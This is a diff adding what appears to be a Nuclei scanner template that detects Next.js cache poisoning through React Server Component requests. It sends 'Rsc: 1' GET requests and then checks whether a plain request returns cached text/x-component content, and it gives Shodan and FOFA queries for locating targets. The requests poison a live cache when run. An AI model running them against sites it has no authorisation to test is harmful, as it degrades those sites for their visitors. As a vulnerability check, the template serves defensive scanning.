@@ -1,0 +1,52 @@
+id: nextjs-rsc-cache
+
+info:
+  name: Next.js Cache Poisoning using RSC
+  author: DhiyaneshDk
+  severity: high
+  reference:
+    - https://zhero-web-sec.github.io/research-and-things/nextjs-and-cache-poisoning-a-quest-for-the-black-hole
+  metadata:
+    verified: true
+    vendor: vercel
+    product: next.js
+    framework: node.js
+    shodan-query:
+      - http.html:"/_next/static"
+      - cpe:"cpe:2.3:a:zeit:next.js"
+    fofa-query: body="/_next/static"
+  tags: next-js,cache
+
+variables:
+  rand: "{{rand_text_numeric(5)}}"
+
+http:
+  - raw:
+      - |
+        GET /?cb={{rand}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Priority: u=1
+        Rsc: 1
+    
+      - |
+        @timeout: 5s
+        GET /?cb={{rand}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Priority: u=1
+        Rsc: 1
+
+      - |
+        @timeout: 5s
+        GET /?cb={{rand}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200 && contains(content_type_2, 'text/x-component')"
+          - "status_code_3 == 200 && contains(content_type_3, 'text/x-component')"
+        condition: and
